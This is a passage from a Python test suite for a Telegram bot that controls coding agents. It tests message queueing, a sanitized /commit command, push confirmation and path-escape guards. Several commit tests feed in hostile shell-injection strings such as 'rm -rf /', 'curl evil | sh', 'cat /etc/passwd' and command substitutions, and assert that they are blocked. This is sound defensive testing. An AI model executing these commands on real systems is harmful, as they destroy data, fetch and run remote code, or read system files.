        update.callback_query.answer = fake_answer
        update.callback_query.edit_message_text = fake_edit

        await router.handle_queue_continue_callback(update, SimpleNamespace(args=[], bot=bot))

        assert answers == ["answered"]
        assert edited == ["Pending queued questions were discarded."]
        assert len(runner.resume_calls) == 1
        assert not router._chat_message_queue_files.get(123)
        assert router._chat_processing_queue_files.get(123) is None

    asyncio.run(exercise())


def test_completed_run_with_pending_queue_starts_next_file_without_prompt(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = BlockingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_queue", "queue-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    async def exercise():
        bot = FakeBot()
        first_task = asyncio.create_task(router.handle_message(make_update(text="first question"), SimpleNamespace(args=[], bot=bot)))
        started = await asyncio.to_thread(runner.wait_started, 1, 1.0)
        assert started is True

        await router.handle_message(make_update(text="second question"), SimpleNamespace(args=[], bot=bot))
        runner.release_next()
        started_second = await asyncio.to_thread(runner.wait_started, 2, 1.0)
        assert started_second is True
        runner.release_next()
        await first_task

        assert len(runner.resume_calls) == 2
        assert not any(
            "Do you want to continue processing the pending queued questions?" in message
            for _, message, _, _ in bot.messages
        )

    asyncio.run(exercise())


def test_assistant_output_is_chunked_by_rendered_html_length(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = LongEscapedMarkdownRunner()
    cfg = make_config(tmp_path)
    cfg = AppConfig(**{**cfg.__dict__, "max_telegram_message_length": 160})
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_html", "html-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="show long html")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert all(len(message[1]) <= cfg.max_telegram_message_length for message in bot.messages[1:])


def test_unsupported_message_type_is_rejected(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=None, video=object()),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_unsupported_message(update, context))

    assert "This bot currently accepts text messages, photos, voice messages, and audio files." in bot.messages[-1][1]


def _make_commit_router(tmp_path: Path, *, git_manager=None, trusted: bool = True) -> tuple[CommandRouter, Path]:
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    cfg = AppConfig(**{**cfg.__dict__, "enable_commit_command": True})
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_commit", "commit-session", "backend", "codex")
    if trusted:
        store.trust_project("backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = git_manager or FakeGitManager(is_git_repo=True)
    router.runtime.git = router.git
    return router, backend


def _run_commit_command(router: CommandRouter, raw: str) -> FakeBot:
    update = make_update(text=raw)
    bot = FakeBot()
    context = SimpleNamespace(args=raw.split()[1:], bot=bot)
    asyncio.run(router.handle_commit(update, context))
    return bot


def _run_push_command(router: CommandRouter) -> FakeBot:
    update = make_update(text="/push")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router.handle_push(update, context))
    return bot


def test_commit_executes_only_valid_git_commands_and_ignores_non_git_segments(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[
                SimpleNamespace(success=True, message="git add completed."),
                SimpleNamespace(success=True, message="git commit completed.", stdout="[telegram-enhance 5b9a263] safe"),
            ],
        ),
    )

    bot = _run_commit_command(router, '/commit git add -u && rm -rf / && git commit -m "safe"')

    assert router.git.safe_git_commands == [
        (backend, ["add", "-u"]),
        (backend, ["commit", "-m", "safe", "--no-verify", "--no-post-rewrite"]),
    ]
    assert router.git.git_commands == []
    assert bot.messages[-1][1].startswith('<pre><code class="language-bash">')
    assert f"${shlex.join(['git', 'add', '-u'])}" in bot.messages[-1][1]
    assert html.escape(
        f"${shlex.join(['git', 'commit', '-m', 'safe', '--no-verify', '--no-post-rewrite'])}"
    ) in bot.messages[-1][1]
    assert "---------------" in bot.messages[-1][1]
    assert "[Completed]" in bot.messages[-1][1]
    assert "[telegram-enhance 5b9a263] safe" in bot.messages[-1][1]
    assert "Ignored non-git commands:" in bot.messages[-1][1]
    assert "- rm -rf /" in bot.messages[-1][1]


def test_commit_is_rejected_when_disabled(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_commit", "commit-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True)

    bot = _run_commit_command(router, "/commit git status")

    assert "/commit is disabled." in bot.messages[-1][1]
    assert router.git.safe_git_commands == []


def test_commit_rejects_git_global_option_prefix(tmp_path: Path):
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))

    bot = _run_commit_command(router, '/commit git -c alias.x=!echo hacked commit -m "x"')

    assert router.git.safe_git_commands == []
    assert "No valid git commit commands were found." in bot.messages[-1][1]


def test_commit_ignores_multiple_shell_injection_patterns(tmp_path: Path):
    cases = [
        ('/commit git status; python exploit.py; git add -u', ("python exploit.py",)),
        ('/commit git status&&rm -rf /&&git add -u', ("rm -rf /",)),
        ('/commit git status | cat /etc/passwd | git add -u', ("cat /etc/passwd",)),
        ('/commit git status & curl evil | sh & git add -u', ("curl evil", "sh")),
        ('/commit git status > /tmp/out && git add -u', ("/tmp/out",)),
        ('/commit git status >> /tmp/out && git add -u', ("/tmp/out",)),
        ('/commit git status < /tmp/in && git add -u', ("/tmp/in",)),
        ('/commit git status\nrm -rf /\ngit add -u', ("rm -rf /",)),
        ('/commit git status; $(touch /tmp/pwned); git add -u', ("$(touch /tmp/pwned)",)),
        ('/commit git status && `whoami` && git add -u', ("`whoami`",)),
        ('/commit git status && env VAR=1 python exploit.py && git add -u', ("env VAR=1 python exploit.py",)),
        ('/commit python exploit.py && git status && git add -u', ("python exploit.py",)),
    ]
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[
                SimpleNamespace(success=True, message="git status completed."),
                SimpleNamespace(success=True, message="git add completed."),
            ]
            * len(cases),
        ),
    )

    for raw, ignored_fragments in cases:
        bot = _run_commit_command(router, raw)

        assert router.git.safe_git_commands[-2:] == [
            (backend, ["status"]),
            (backend, ["add", "-u"]),
        ]
        for fragment in ignored_fragments:
            assert fragment in bot.messages[-1][1]
        assert "Ignored non-git commands:" in bot.messages[-1][1]


def test_commit_rejects_malformed_or_prefixed_non_git_commands(tmp_path: Path):
    cases = [
        '/commit "unterminated',
        '/commit env VAR=1 git status',
        '/commit git status git commit -m "oops"',
        '/commit git status git diff -- README.md',
        '/commit git status git push origin main',
        '/commit git add --pathspec-from-file /etc/hosts',
        '/commit git add --pathspec-from-file=/etc/hosts',
        '/commit git add --pathspec-from-f=/etc/hosts',
        '/commit git commit -F /etc/hosts',
        '/commit git commit -F/etc/hosts',
        '/commit git commit --file=/etc/hosts',
        '/commit git commit --allow-empty --fil=/etc/hosts',
        '/commit git commit --templ=/etc/hosts',
        '/commit git diff -- README.md',
        '/commit git diff --no-index /etc/passwd /dev/null',
    ]
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))

    for raw in cases:
        bot = _run_commit_command(router, raw)

        assert router.git.safe_git_commands == []
        assert "No valid git commit commands were found." in bot.messages[-1][1]


def test_commit_allows_adjacent_valid_git_commands_without_spaces(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[
                SimpleNamespace(success=True, message="git status completed."),
                SimpleNamespace(success=True, message="git add completed."),
            ],
        ),
    )

    bot = _run_commit_command(router, '/commit git status&&git add -u')

    assert router.git.safe_git_commands == [
        (backend, ["status"]),
        (backend, ["add", "-u"]),
    ]
    assert bot.messages[-1][1].startswith('<pre><code class="language-bash">')
    assert f"${shlex.join(['git', 'status'])}" in bot.messages[-1][1]
    assert f"${shlex.join(['git', 'add', '-u'])}" in bot.messages[-1][1]
    assert "[Completed]" in bot.messages[-1][1]
    assert "Ignored non-git commands:" not in bot.messages[-1][1]


def test_commit_allows_common_safe_short_forms(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[
                SimpleNamespace(success=True, message="git status completed."),
                SimpleNamespace(success=True, message="git commit completed."),
            ],
        ),
    )

    bot = _run_commit_command(router, '/commit git status -sb&&git commit -msafe')

    assert router.git.safe_git_commands == [
        (backend, ["status", "-sb"]),
        (backend, ["commit", "-msafe", "--no-verify", "--no-post-rewrite"]),
    ]
    assert f"${shlex.join(['git', 'status', '-sb'])}" in bot.messages[-1][1]
    assert html.escape(
        f"${shlex.join(['git', 'commit', '-msafe', '--no-verify', '--no-post-rewrite'])}"
    ) in bot.messages[-1][1]
    assert "[Completed]" in bot.messages[-1][1]


def test_commit_allows_shell_style_backslash_newline_continuations(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[
                SimpleNamespace(success=True, message="git add completed."),
                SimpleNamespace(success=True, message="git commit completed."),
            ],
        ),
    )

    raw = '/commit git add \\\n  src/app.py \\\n  tests/test_app.py && git commit -m "safe"'
    bot = _run_commit_command(router, raw)

    assert router.git.safe_git_commands == [
        (backend, ["add", "src/app.py", "tests/test_app.py"]),
        (backend, ["commit", "-m", "safe", "--no-verify", "--no-post-rewrite"]),
    ]
    assert "[Completed]" in bot.messages[-1][1]


def test_commit_inserts_enforced_flags_before_pathspec_separator(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[SimpleNamespace(success=True, message="git commit completed.")],
        ),
    )

    bot = _run_commit_command(router, '/commit git commit -m "safe" -- tracked.txt')

    assert router.git.safe_git_commands == [
        (
            backend,
            ["commit", "-m", "safe", "--no-verify", "--no-post-rewrite", "--", "tracked.txt"],
        ),
    ]
    assert html.escape(
        f"${shlex.join(['git', 'commit', '-m', 'safe', '--no-verify', '--no-post-rewrite', '--', 'tracked.txt'])}"
    ) in bot.messages[-1][1]
    assert "[Completed]" in bot.messages[-1][1]


def test_commit_inserts_enforced_flags_before_implicit_pathspec(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[SimpleNamespace(success=True, message="git commit completed.")],
        ),
    )

    bot = _run_commit_command(router, '/commit git commit -m "safe" tracked.txt')

    assert router.git.safe_git_commands == [
        (
            backend,
            ["commit", "-m", "safe", "--no-verify", "--no-post-rewrite", "tracked.txt"],
        ),
    ]
    assert html.escape(
        f"${shlex.join(['git', 'commit', '-m', 'safe', '--no-verify', '--no-post-rewrite', 'tracked.txt'])}"
    ) in bot.messages[-1][1]
    assert "[Completed]" in bot.messages[-1][1]


def test_commit_allows_shell_like_text_inside_quoted_pathspec(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[SimpleNamespace(success=True, message="git add completed.")],
        ),
    )

    bot = _run_commit_command(router, '/commit git add "file && keep | chars > literally.txt"')

    assert router.git.safe_git_commands == [
        (backend, ["add", "file && keep | chars > literally.txt"]),
    ]
    assert bot.messages[-1][1].startswith('<pre><code class="language-bash">')
    assert html.escape(f"${shlex.join(['git', 'add', 'file && keep | chars > literally.txt'])}") in bot.messages[-1][1]
    assert "[Completed]" in bot.messages[-1][1]
    assert "Ignored non-git commands:" not in bot.messages[-1][1]


def test_commit_reports_missing_project_folder_before_git_calls(tmp_path: Path):
    router, backend = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))
    backend.rmdir()

    bot = _run_commit_command(router, "/commit git status")

    assert router.git.safe_git_commands == []
    assert "Project folder no longer exists for this session: backend" in bot.messages[-1][1]


def test_commit_rejects_parent_path_escape(tmp_path: Path):
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))

    bot = _run_commit_command(router, "/commit git add ../secret.txt")

    assert router.git.safe_git_commands == []
    assert "Unsafe path arguments are not allowed." in bot.messages[-1][1]


def test_commit_rejects_absolute_paths(tmp_path: Path):
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))

    bot = _run_commit_command(router, "/commit git commit -m safe -- /etc/passwd")

    assert router.git.safe_git_commands == []
    assert "Unsafe path arguments are not allowed." in bot.messages[-1][1]


def test_commit_rejects_pathspec_magic(tmp_path: Path):
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))

    bot = _run_commit_command(router, "/commit git status -- :(top)README.md")

    assert router.git.safe_git_commands == []
    assert "Unsafe path arguments are not allowed." in bot.messages[-1][1]


def test_commit_rejects_mutating_git_commands_for_untrusted_project(tmp_path: Path):
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True), trusted=False)

    bot = _run_commit_command(router, "/commit git add -u && git commit -m safe")

    assert router.git.safe_git_commands == []
    assert "This project is not trusted for mutating git operations." in bot.messages[-1][1]


def test_commit_allows_status_for_untrusted_project(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[SimpleNamespace(success=True, message="git status completed.")],
        ),
        trusted=False,
    )

    bot = _run_commit_command(router, "/commit git status")

    assert router.git.safe_git_commands == [
        (backend, ["status"]),
    ]
    assert "[Completed]" in bot.messages[-1][1]


def test_push_uses_current_session_branch(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    cfg = AppConfig(**{**cfg.__dict__, "enable_commit_command": True})
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_push", "push-session", "backend", "codex", branch_name="feature-1")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="feature-1",
        push_result=SimpleNamespace(success=True, message="Pushed branch 'feature-1' to origin.", current_branch="feature-1"),
    )
    router.runtime.git = router.git

    bot = _run_push_command(router)

    assert router.git.push_calls == []
    assert bot.messages[-1][1] == "Push branch `feature-1` to `origin`?"
    assert bot.messages[-1][2] == "Markdown"
    assert bot.messages[-1][3] is not None
    buttons = bot.messages[-1][3].inline_keyboard[0]
    assert buttons[0].text == "Confirm push"
    assert buttons[1].text == "Cancel"
    assert buttons[0].api_kwargs == {"style": "primary"}
    assert buttons[1].api_kwargs == {"style": "danger"}


def test_push_confirmation_executes_push(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    cfg = AppConfig(**{**cfg.__dict__, "enable_commit_command": False})
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_push", "push-session", "backend", "codex", branch_name="feature-1")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="feature-1",
        push_result=SimpleNamespace(success=True, message="Pushed branch 'feature-1' to origin.", current_branch="feature-1"),
    )
    router.runtime.git = router.git
    edited = []
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="push:confirm",
            answer=None,
            edit_message_text=None,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text, parse_mode=None):
        edited.append((text, parse_mode))

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_push_callback(update, context))

    assert edited == [("Pushing branch `feature-1` to `origin`...", "Markdown")]
    assert router.git.push_calls == [(backend, "feature-1")]
    assert bot.messages[-1][1].startswith('<pre><code class="language-bash">')
    assert f"${shlex.join(['git', 'push', 'origin', 'feature-1'])}" in bot.messages[-1][1]
    assert "[Completed]" in bot.messages[-1][1]


def test_push_confirmation_cancel_does_not_push(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_push", "push-session", "backend", "codex", branch_name="feature-1")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="feature-1")
    router.runtime.git = router.git
    edited = []
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="push:cancel",
            answer=None,
            edit_message_text=None,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text):
        edited.append(text)

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_push_callback(update, context))

    assert edited == ["Push cancelled."]
    assert router.git.push_calls == []


def test_push_reports_missing_project_folder_before_git_calls(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    cfg = AppConfig(**{**cfg.__dict__, "enable_commit_command": True})
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_push", "push-session", "backend", "codex", branch_name="feature-1")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="feature-1")
    router.runtime.git = router.git
    backend.rmdir()

    bot = _run_push_command(router)

    assert router.git.push_calls == []
    assert "Project folder no longer exists for this session: backend" in bot.messages[-1][1]


# ---------------------------------------------------------------------------
# _path_within_project — symlink traversal guard
# ---------------------------------------------------------------------------


def test_path_within_project_allows_normal_files(tmp_path: Path):
    from coding_agent_telegram.router.base import CommandRouterBase

    project = tmp_path / "project"
    project.mkdir()
    (project / "src").mkdir()
    (project / "src" / "file.py").write_text("x")

    assert CommandRouterBase._path_within_project(project, "src/file.py")
    assert CommandRouterBase._path_within_project(project, "README.md")


def test_path_within_project_blocks_symlink_escape(tmp_path: Path):
    """A symlink inside the project pointing outside must be rejected."""
    from coding_agent_telegram.router.base import CommandRouterBase

    project = tmp_path / "project"
    project.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret.txt").write_text("secret")

    # Create a symlink inside the project that points outside
    link = project / "external_link"
    link.symlink_to(outside)

    assert not CommandRouterBase._path_within_project(project, "external_link/secret.txt")


def test_path_within_project_blocks_symlink_to_file_outside(tmp_path: Path):
    """A symlink to a single file outside the project must also be rejected."""
    from coding_agent_telegram.router.base import CommandRouterBase

    project = tmp_path / "project"
    project.mkdir()
    secret = tmp_path / "secret.txt"
    secret.write_text("secret")

    link = project / "linked_secret.txt"
    link.symlink_to(secret)

    assert not CommandRouterBase._path_within_project(project, "linked_secret.txt")


# ---------------------------------------------------------------------------
# Workspace lock — concurrent agent runs on the same project are blocked
# ---------------------------------------------------------------------------


def test_workspace_lock_blocks_second_call_on_same_project(tmp_path: Path):
    """When a workspace lock is held, a second _run_with_typing call on the same
    project must be rejected immediately with an 'already running' message."""
    from coding_agent_telegram.agent_runner import MultiAgentRunner

    runner_real = MultiAgentRunner(
        codex_bin="codex",
        copilot_bin="copilot",
        approval_policy="never",
        sandbox_mode="workspace-write",
    )
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner_real, bot_id="bot-a"))

    messages_sent: list = []

    async def run():
        # Manually hold the workspace lock to simulate an in-flight agent run.
        lock = router._workspace_locks.setdefault("myproject", asyncio.Lock())
        async with lock:
            bot = FakeBot()
            update = make_update()
            context = SimpleNamespace(args=[], bot=bot)
            result = await router._run_with_typing(
                update,
                context,
                runner_real.resume_session,
                "codex",
                "sess_1",
                tmp_path,
                "hello",
                workspace_lock_key="myproject",
            )
            assert result is None
            messages_sent.extend(bot.messages)

    asyncio.run(run())
    assert any("already running" in msg[1] for msg in messages_sent)


def test_workspace_lock_allows_different_projects_concurrently(tmp_path: Path):
    """Two calls with different workspace_lock_keys must not block each other."""
    from coding_agent_telegram.agent_runner import MultiAgentRunner

    runner_real = MultiAgentRunner(
        codex_bin="codex",
        copilot_bin="copilot",
        approval_policy="never",
        sandbox_mode="workspace-write",
    )
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner_real, bot_id="bot-a"))

    async def run():
        # Hold the lock for "project-a"
        lock_a = router._workspace_locks.setdefault("project-a", asyncio.Lock())
        async with lock_a:
            # "project-b" lock should be free — lock.locked() returns False
            lock_b = router._workspace_locks.setdefault("project-b", asyncio.Lock())
            assert not lock_b.locked()

    asyncio.run(run())


# ---------------------------------------------------------------------------
# message_commands — null message guards (lines 15, 31)
# ---------------------------------------------------------------------------


def test_handle_message_does_nothing_when_message_is_none(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert bot.messages == []


def test_handle_message_does_nothing_when_text_is_empty(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text="", photo=None, caption=None),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert bot.messages == []


def test_handle_photo_does_nothing_when_message_is_none(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_photo(update, context))

    assert bot.messages == []


# ---------------------------------------------------------------------------
# git_commands — commit disabled, empty args, git command fails
# ---------------------------------------------------------------------------


def test_commit_sends_disabled_message_when_not_enabled(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    # enable_commit_command defaults to False in make_config
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True)
    router.runtime.git = router.git

    update = make_update(text="/commit git add .")
    bot = FakeBot()
    context = SimpleNamespace(args=["git", "add", "."], bot=bot)
    asyncio.run(router.handle_commit(update, context))

    assert "disabled" in bot.messages[-1][1].lower()


def test_commit_sends_usage_when_no_text_after_command(tmp_path: Path):
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text="/commit", photo=None, caption=None),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router.handle_commit(update, context))

    assert "Usage" in bot.messages[-1][1]


def test_commit_reports_failed_git_command_and_stops(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[SimpleNamespace(success=False, message="nothing to commit")],
        ),
    )

    bot = _run_commit_command(router, "/commit git add -u")

    assert router.git.safe_git_commands != []
    assert "nothing to commit" in bot.messages[-1][1]


# ---------------------------------------------------------------------------
# git_commands — handle_push edge cases
# ---------------------------------------------------------------------------


def test_push_sends_usage_when_extra_args_provided(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess1", "s1", "backend", "codex", branch_name="main")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="main")
    router.runtime.git = router.git

    update = make_update(text="/push extra")
    bot = FakeBot()
    context = SimpleNamespace(args=["extra"], bot=bot)
    asyncio.run(router.handle_push(update, context))

    assert "Usage" in bot.messages[-1][1]


def test_push_warns_when_branch_cannot_be_determined(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    # session with no branch_name stored
    store.create_session("bot-a", 123, "sess1", "s1", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    # current_branch also returns None
    router.git = FakeGitManager(is_git_repo=True, current_branch=None)
    router.runtime.git = router.git

    bot = _run_push_command(router)

    assert "Could not determine" in bot.messages[-1][1]


# ---------------------------------------------------------------------------
# session_commands — handle_switch
# ---------------------------------------------------------------------------


def _make_switch_router(tmp_path: Path) -> CommandRouter:
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)
    router.runtime.git = router.git
    return router


def test_switch_command_reports_no_sessions_when_empty(tmp_path: Path):
    router = _make_switch_router(tmp_path)
    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router.handle_switch(update, context))
    assert "No sessions found" in bot.messages[-1][1]


def test_switch_command_lists_sessions_when_no_arg(tmp_path: Path):
    router = _make_switch_router(tmp_path)
    router.deps.store.create_session("bot-a", 123, "sess-abc", "my-session", "backend", "codex")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router.handle_switch(update, context))

    assert "my-session" in bot.messages[-1][1]


def test_switch_command_handles_page_arg(tmp_path: Path):
    router = _make_switch_router(tmp_path)
    router.deps.store.create_session("bot-a", 123, "sess-abc", "my-session", "backend", "codex")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["page", "1"], bot=bot)
    asyncio.run(router.handle_switch(update, context))

    assert "my-session" in bot.messages[-1][1]


def test_switch_command_rejects_non_numeric_page(tmp_path: Path):
    router = _make_switch_router(tmp_path)
    router.deps.store.create_session("bot-a", 123, "sess-abc", "my-session", "backend", "codex")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["page", "abc"], bot=bot)
    asyncio.run(router.handle_switch(update, context))

    assert "Invalid page number" in bot.messages[-1][1]


def test_switch_command_by_session_id_activates_session(tmp_path: Path):
    router = _make_switch_router(tmp_path)
    router.deps.store.create_session("bot-a", 123, "sess-abc", "my-session", "backend", "codex")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["sess-abc"], bot=bot)
    asyncio.run(router.handle_switch(update, context))

    # Should send a confirmation message
    assert any("my-session" in m[1] or "sess-abc" in m[1] or "Switched" in m[1] for m in bot.messages)


def test_switch_command_reports_not_found_for_unknown_session_id(tmp_path: Path):
    router = _make_switch_router(tmp_path)

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["sess-nonexistent"], bot=bot)
    asyncio.run(router.handle_switch(update, context))

    assert "not found" in bot.messages[-1][1].lower()


def test_switch_command_reports_missing_project_folder(tmp_path: Path):
    backend = (tmp_path / "vanished").resolve()  # intentionally doesn't exist
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess-xyz", "ghost-session", "vanished", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)
    router.runtime.git = router.git

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["sess-xyz"], bot=bot)
